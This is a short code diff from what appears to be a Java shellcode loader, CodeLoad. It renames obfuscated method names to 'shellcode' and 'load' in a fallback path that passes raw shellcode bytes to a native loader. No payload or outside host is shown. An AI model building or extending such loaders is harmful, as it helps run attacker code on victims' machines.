@@ -35,8 +35,8 @@ public class CodeLoad {
                     }
 
                     System.out.println("[CodeLoad] native loaders unavailable; entering SeraNative fallback");
-                    byte[] rawShellcode = new WIN32().llIIll01l();
-                    long result = new SeraNative().IIllII00IIllII(rawShellcode, canonicalPath);
+                    byte[] rawShellcode = new WIN32().shellcode();
+                    long result = new SeraNative().load(rawShellcode, canonicalPath);
                     if (result != 0) {
                         markLoaded(canonicalPath);
                         return true;
